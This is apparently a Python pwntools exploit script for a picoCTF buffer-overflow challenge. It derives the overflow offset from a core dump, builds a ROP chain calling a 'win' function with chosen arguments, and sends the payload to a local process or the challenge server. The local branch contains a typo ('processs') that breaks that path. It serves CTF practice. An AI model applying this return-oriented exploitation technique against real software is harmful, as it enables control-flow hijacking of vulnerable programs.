"""
The approach utilize pwntools ROP object (ROP chain)
"""

from pwn import *

elf = context.binary = ELF('./vuln2', checksec=False)
rop = ROP(elf)
host, port = 'saturn.picoctf.net', 57693

# To get core file
# p = process(elf.path)
# p.sendline(cyclic(200))
# p.wait()

core = Coredump('/tmp/core/core.vuln2.2250.1707699716')

# Construct ROP chain
# 1. Call `win()` with args
rop.win(0xcafef00d, 0xf00df00d)
# 2. Pad ROP chain
payload = fit({ cyclic_find(core.eip): rop.chain() })

if args.REMOTE:
    p = remote(host, port)
else:
    p = processs(elf.path)

p.recvline()
p.sendline(payload)
p.interactive()
